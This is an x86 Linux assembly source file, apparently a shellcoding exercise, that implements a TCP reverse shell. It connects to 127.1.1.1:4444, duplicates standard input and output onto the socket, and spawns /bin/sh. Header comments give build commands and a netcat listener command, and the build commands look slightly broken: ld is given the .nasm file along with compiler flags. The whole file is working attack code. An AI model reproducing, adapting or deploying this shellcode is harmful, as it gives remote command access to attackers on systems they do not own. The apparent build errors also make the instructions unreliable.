;Program: Tcp_Reverse_shell-x86
;Author : Bhanu Teja
;Compilation & Execution Steps:

;# nasm -f elf32 reverseshell.nasm
;# ld reverseshell.nasm -o reverseshell -fno-stack-protector -shared -z execstack
;# start netcat listener on port 4444 # nc -nlvp 4444
;# ./reverseshell

;----start----;

global _start

section .text
_start:

;zeroing reg's

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;creating a socket
mov al, 0x66	; socketcall syscall 102 hex => 0x66
mov bl, 0x1	; sys_socket 1
push ecx	; 0 for IPPROTO_IP
push ebx	; 1 for sock_stream
push 0x2	; 2 for af_inet | pf_inet
mov ecx, esp	; ecx points to top of stack
int 0x80

mov edi, eax	; sockfd is now in edi

;connect to IP and Port
mov al, 0x66	; socketcall syscall 102 hex => 0x66
inc bl		; bl = 2
push 0x0101017f	; s_addr = 127.1.1.1=>x7f\x01\x01\x01 => BigEndian 0x0101017f
push word 0x5c11; s_port=4444 => hex = 0x115c => BigEndian 0x5c11
push bx		; af_inet = 2
mov ecx, esp	; ecx points to top of stack
push 0x10	; sizeof sockaddr
push ecx	; pushing pointer to sockaddr struct onto stack
push edi	; sockfd is in edi
mov ecx, esp	; ecx points to top of stack
inc bl		; bl = 3; sys_connect = 3
int 0x80

;redirect I/O using dup2 STDIN=0 STDOUT=1 STDERR=2
xchg ebx, edi	; exchange sockfd 
xor ecx, ecx	

loop:
	mov al, 0x3f	; dup2 sycall 63 hex => 0x3f
	int 0x80	; execute
	inc cl		; increment cl
	cmp cl, 0x4	; compare if cl = 4
	jne loop	; jump to loop if not equal to 4


;execute shellcode
mov al, 0xb	; execve syscall 11 hex => 0xb
xor edx, edx
push edx	; null endpoint
push 0x68732f2f	; "hs//"
push 0x6e69622f ; "nib/"
mov ebx, esp	; ebx points to top of stack
mov ecx, edx	; edx=0 -> edx
int 0x80
